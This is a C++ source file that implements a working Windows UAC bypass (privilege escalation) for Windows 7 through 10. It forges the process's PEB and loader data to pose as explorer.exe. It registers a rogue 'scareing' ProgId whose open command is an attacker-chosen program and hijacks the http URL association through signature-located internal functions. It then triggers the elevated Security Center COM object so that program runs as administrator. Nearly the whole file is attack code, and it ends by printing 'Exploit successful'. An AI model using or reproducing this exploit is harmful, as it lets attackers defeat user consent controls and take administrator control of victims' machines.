#include "Security Center.h"



#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	void* Handle;
} CURDIR, * PCURDIR;

typedef struct _STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_94;
	char* Buffer;
} STRING, * PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	unsigned short Flags;
	unsigned short Length;
	unsigned long TimeStamp;
	struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	unsigned long MaximumLength;
	unsigned long Length;
	unsigned long Flags;
	unsigned long DebugFlags;
	void* ConsoleHandle;
	unsigned long ConsoleFlags;
	long Padding_95;
	void* StandardInput;
	void* StandardOutput;
	void* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
	void* Environment;
	unsigned long StartingX;
	unsigned long StartingY;
	unsigned long CountX;
	unsigned long CountY;
	unsigned long CountCharsX;
	unsigned long CountCharsY;
	unsigned long FillAttribute;
	unsigned long WindowFlags;
	unsigned long ShowWindowFlags;
	long Padding_96;
	struct _UNICODE_STRING WindowTitle;
	struct _UNICODE_STRING DesktopInfo;
	struct _UNICODE_STRING ShellInfo;
	struct _UNICODE_STRING RuntimeData;
	struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	unsigned __int64 EnvironmentSize;
	unsigned __int64 EnvironmentVersion;
	void* PackageDependencyData;
	unsigned long ProcessGroupId;
	unsigned long LoaderThreads;
	struct _UNICODE_STRING RedirectionDllName;
	struct _UNICODE_STRING HeapPartitionName;
	unsigned __int64* DefaultThreadpoolCpuSetMasks;
	unsigned long DefaultThreadpoolCpuSetMaskCount;
	long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

constexpr auto PEB_OFFSET = 0x60ULL;
constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
constexpr auto BASENAME_OFFSET = 0x58ULL;
constexpr auto FULLNAME_OFFSET = 0x48ULL;
constexpr auto DLL_BASE_OFFSET = 0x30ULL;
constexpr auto OS_MAJOR_VERSION_OFFSET = 0x118ULL;
constexpr auto OS_MINOR_VERSION_OFFSET = 0x11CULL;
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

using UserAssocSetPtr = void(WINAPI*)(int unknown0, PCWCHAR fileType, PCWCHAR progId);
using UserAssocSetInternalPtr = HRESULT(WINAPI*)(void* unused0, PCWCHAR fileType, PCWCHAR progId, int unknown0);

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

struct IWscAdmin : IUnknown
{
	virtual HRESULT Initialize(
	) = 0;

	virtual HRESULT DoModalSecurityAction(
		HWND parentWindow,
		UINT securityAction,
		LONG_PTR unused0
	) = 0;
};

const GUID IID_IWscAdmin = { 0x49ACAA99, 0xF009, 0x4524, {0x9D, 0x2A, 0xD7, 0x51, 0xC9, 0xA3, 0x8F, 0x60} };

const BYTE SIGNATURE_NT10[] = {
	0x48, 0x8B, 0xC4, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xEF, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x20
};

const BYTE SIGNATURE_NT6X[] = {
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0xFE, 0xFF,
	0xFF, 0x48, 0x81, 0xEC, 0x80, 0x02, 0x00, 0x00
};

void ForgeProcessInformation_sc(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
{
	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
		{
			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);

			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
				ULONG_PTR>(params->ImageBase))
			{
				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

				params->RtlInitUnicodeString(baseName, L"explorer.exe");
				params->RtlInitUnicodeString(fullName, params->ExplorerPath);

				*stop = TRUE;
			}
		}, reinterpret_cast<PVOID>(&params));
}

template <typename T>
T LocateSignature(const BYTE signature[], const int signatureSize, const char* sectionName, const HMODULE moduleHandle)
{
	auto* headers = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PUCHAR>(moduleHandle) + reinterpret_cast<
		PIMAGE_DOS_HEADER>(moduleHandle)->e_lfanew);
	auto* sectionHeader = IMAGE_FIRST_SECTION(headers);

	while (std::strcmp(sectionName, reinterpret_cast<char*>(sectionHeader->Name)))
		sectionHeader++;

	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData; i != reinterpret_cast<
		PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++
		)
	{
		if (std::memcmp(signature, i, signatureSize) == 0)
			return reinterpret_cast<T>(i);
	}

	return reinterpret_cast<T>(nullptr);
}

int Security_Center(char* arg)
{
	char* secret = arg;
	//char* secret = argv[1];
	//char* secret = (char*)"notepad.exe";
	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);



	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	const auto osMajorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MAJOR_VERSION_OFFSET);
	const auto osMinorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MINOR_VERSION_OFFSET);

	if (osMajorVersion <= 6 && osMinorVersion < 1)
	{
		std::wcout << L"OS not supported.\n";
		return EXIT_FAILURE;
	}

	PWSTR windowsPath, systemPath;
	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
	if (FAILED(hr))
	{
		std::wcout << L"SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(hr))
	{
		CoTaskMemFree(windowsPath);
		std::wcout << L"SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	//std::wstring explorer{windowsPath}, system32{systemPath};
	std::wstring explorer{ windowsPath };
	CoTaskMemFree(windowsPath);
	CoTaskMemFree(systemPath);
	explorer += L"\\explorer.exe";

	const auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	const auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	ForgeProcessInformation_sc(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);

	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(hr))
	{
		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	HKEY key;
	auto status = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing\\shell\\open\\command", 0,
		nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
	if (status)
	{
		CoUninitialize();
		std::wcout << L"RegCreateKeyExW() failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}
	//system32 += L"\\cmd.exe";
	//status = RegSetValueExW(key, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(system32.c_str()),static_cast<DWORD>(system32.size() * sizeof WCHAR + sizeof(L'\0')));
	//DWORD les = 108;
	bstr_t b(secret);
	WCHAR* x = b;
	status = RegSetValueExW(key, nullptr, 0, REG_SZ, (PBYTE)x, wcslen(x) * 2 + 2);

	RegCloseKey(key);
	if (status)
	{
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
		CoUninitialize();
		std::wcout << L"RegSetValueExW() failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}

	if (osMajorVersion == 10 && osMinorVersion == 0)
	{
		const auto hModule = LoadLibraryExW(L"SystemSettings.Handlers.dll", nullptr,
			LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!hModule)
		{
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout << L"LoadLibraryExW() failed. Error: " << GetLastError() << std::endl;
			return EXIT_FAILURE;
		}

		const auto UserAssocSetInternal = LocateSignature<UserAssocSetInternalPtr>(
			SIGNATURE_NT10, sizeof SIGNATURE_NT10, ".text", hModule);
		if (!UserAssocSetInternal)
		{
			FreeLibrary(hModule);
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout << L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" not found.\n";
			return EXIT_FAILURE;
		}

		hr = UserAssocSetInternal(nullptr, L"http", L"scareing", 1);
		FreeLibrary(hModule);
		if (FAILED(hr))
		{
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout <<
				L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" did not return S_OK. Return value -> HRESULT 0x"
				<< std::hex << hr << std::endl;
			return EXIT_FAILURE;
		}
	}
	else if (osMajorVersion == 6 && (osMinorVersion == 2 || osMinorVersion == 3))
	{
		const auto hModule = LoadLibraryExW(L"shell32.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32);
		if (!hModule)
		{
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout << L"LoadLibraryExW() failed. Error: " << GetLastError() << std::endl;
			return EXIT_FAILURE;
		}

		const auto UserAssocSet = LocateSignature<UserAssocSetPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text",
			hModule);
		if (!UserAssocSet)
		{
			FreeLibrary(hModule);
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout << L"shell32.dll!UserAssocSet not found.\n";
			return EXIT_FAILURE;
		}

		UserAssocSet(2, L"http", L"scareing");
		FreeLibrary(hModule);
	}
	else if (osMajorVersion == 6 && osMinorVersion == 1)
	{
		auto status = RegSetKeyValueW(
			HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice",
			L"ProgId", REG_SZ, L"scareing", sizeof(L"scareing"));
		if (status)
		{
			RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
			CoUninitialize();
			std::wcout << L"RegSetKeyValueW() failed. LSTATUS: " << status << std::endl;
			return EXIT_FAILURE;
		}
	}

	BIND_OPTS3 bind{};
	bind.cbStruct = sizeof BIND_OPTS3;
	bind.dwClassContext = CLSCTX_LOCAL_SERVER;

	IWscAdmin* wscAdmin;
	hr = CoGetObject(L"Elevation:Administrator!new:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}", &bind, IID_IWscAdmin,
		reinterpret_cast<void**>(&wscAdmin));
	if (FAILED(hr))
	{
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
		CoUninitialize();
		std::wcout << L"CoGetObject() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	hr = wscAdmin->Initialize();
	if (FAILED(hr))
	{
		wscAdmin->Release();
		RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
		CoUninitialize();
		std::wcout << L"CWscAdmin::Initialize() failed. HRESULT: 0x" << std::hex << std::endl;
		return EXIT_FAILURE;
	}

	hr = wscAdmin->DoModalSecurityAction(nullptr, 103, 0);
	/* Sleep for one second to allow the action to happen, otherwise we'll delete the registry key before it has
	 * a chance to read and use it. It's because this action happens async. in another process. I know, its strange
	 * but that's how it is. */
	Sleep(1000);
	wscAdmin->Release();
	RegDeleteTreeW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\scareing");
	CoUninitialize();
	if (FAILED(hr))
	{
		std::wcout << L"CWscAdmin::DoModalSecurityAction() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	SetConsoleTextAttribute(hConsole, 14);
	std::wcout << L"[";
	SetConsoleTextAttribute(hConsole, 15);
	std::wcout << L"~";
	SetConsoleTextAttribute(hConsole, 14);
	std::wcout << L"] *** Exploit successful.\n\n";
	SetConsoleTextAttribute(hConsole, 7);

	return 0;
}
